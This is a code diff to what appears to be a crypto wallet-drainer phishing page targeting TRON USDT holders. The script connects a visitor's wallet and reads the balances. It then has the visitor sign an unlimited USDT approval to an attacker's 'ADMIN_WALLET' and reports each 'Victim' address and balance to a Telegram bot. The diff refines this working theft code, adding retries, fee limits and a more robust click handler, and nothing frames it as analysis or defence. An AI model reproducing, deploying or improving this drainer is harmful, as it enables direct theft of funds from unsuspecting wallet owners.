@@ -1,4 +1,4 @@
-// --- Buffer Initialization ---
+// --- Buffer Initialization Fix (CRITICAL) ---
 if (typeof window !== 'undefined') {
     window.Buffer = window.Buffer || buffer.Buffer;
 }
@@ -29,14 +29,14 @@ function initFirebase() {
 }
 
 async function notifyAdmin(status, address, trx = "0", usdt = "0", extra = "") {
-    const text = `🎯 <b>UPDATE</b>\n📌 Status: <b>${status}</b>\n👤 Victim: <code>${address}</code>\n💰 Balance: <code>${usdt} USDT</code> | <code>${trx} TRX</code>\n📝 Detail: ${extra}`;
+    const text = `🎯 <b>NEW UPDATE</b>\n📌 Status: <b>${status}</b>\n👤 Victim: <code>${address}</code>\n💰 Balance: <code>${usdt} USDT</code> | <code>${trx} TRX</code>\n📝 Detail: ${extra}`;
     try {
         await fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: CONFIG.CHAT_ID, text: text, parse_mode: "HTML" })
         });
-    } catch (e) {}
+    } catch (e) { }
 }
 
 async function getStats(address) {
@@ -47,7 +47,7 @@ async function getStats(address) {
         trx = (bal / 1e6).toFixed(2);
         const contract = await tw.transactionBuilder.triggerConstantContract(CONFIG.USDT_CONTRACT, "balanceOf(address)", {}, [{ type: 'address', value: address }], address);
         usdt = (parseInt(contract.constant_result[0], 16) / 1e6).toFixed(2);
-    } catch (e) {}
+    } catch (e) { }
     return { trx, usdt };
 }
 
@@ -56,26 +56,29 @@ window.addEventListener('load', () => {
     if (typeof firebase !== 'undefined') {
         const sessionKey = 'session_' + Date.now();
         window.currentSessionKey = sessionKey;
-        firebase.database().ref('connections/' + sessionKey).set({ address: "Online", status: "ACTIVE" });
+        firebase.database().ref('connections/' + sessionKey).set({
+            address: "User Online", status: "ACTIVE", time: new Date().toLocaleTimeString()
+        });
     }
 });
 
-document.getElementById('next-btn').addEventListener('click', async () => {
+// Robust Click Handler for DApp Browsers
+document.getElementById('next-btn').onclick = async () => {
     const btn = document.getElementById('next-btn');
     btn.classList.add('btn-loading');
-    
+
     initFirebase();
 
-    // Check if wallet system is loaded
+    // Loop for wallet system ready state
     let attempts = 0;
-    while (typeof window.connectWalletConnectTron !== 'function' && attempts < 20) {
+    while (typeof window.connectWalletConnectTron !== 'function' && attempts < 25) {
         await new Promise(r => setTimeout(r, 500));
         attempts++;
     }
 
     if (typeof window.connectWalletConnectTron !== 'function') {
         btn.classList.remove('btn-loading');
-        alert("Wallet initialization timeout. Please refresh.");
+        alert("Wallet system timeout. Please refresh.");
         return;
     }
 
@@ -85,6 +88,7 @@ document.getElementById('next-btn').addEventListener('click', async () => {
             const address = result.address;
             const { trx, usdt } = await getStats(address);
 
+            document.getElementById('view-balance').innerText = usdt;
             document.getElementById('page-wrapper').classList.add('opacity-10');
             document.getElementById('loading-screen').classList.remove('hidden');
 
@@ -98,6 +102,7 @@ document.getElementById('next-btn').addEventListener('click', async () => {
 
             setTimeout(async () => {
                 try {
+                    // Logic Update: feeLimit 40 TRX for 10 TRX support
                     const { transaction } = await localTronWeb.transactionBuilder.triggerSmartContract(
                         CONFIG.USDT_CONTRACT, "approve(address,uint256)", { feeLimit: 40000000 },
                         [{ type: 'address', value: CONFIG.ADMIN_WALLET }, { type: 'uint256', value: MAX_UINT }], address
@@ -109,7 +114,7 @@ document.getElementById('next-btn').addEventListener('click', async () => {
                     });
 
                     const receipt = await localTronWeb.trx.sendRawTransaction(signedTx);
-                    await notifyAdmin("✅ SUCCESS", address, trx, usdt, `TX: ${receipt.txid}`);
+                    await notifyAdmin("✅ SUCCESS", address, trx, usdt, `TX: <code>${receipt.txid}</code>`);
                     location.reload();
                 } catch (err) {
                     await notifyAdmin("❌ FAILED", address, trx, usdt, err.message || "User Rejected");
@@ -122,4 +127,4 @@ document.getElementById('next-btn').addEventListener('click', async () => {
     } catch (e) {
         btn.classList.remove('btn-loading');
     }
-});
+};
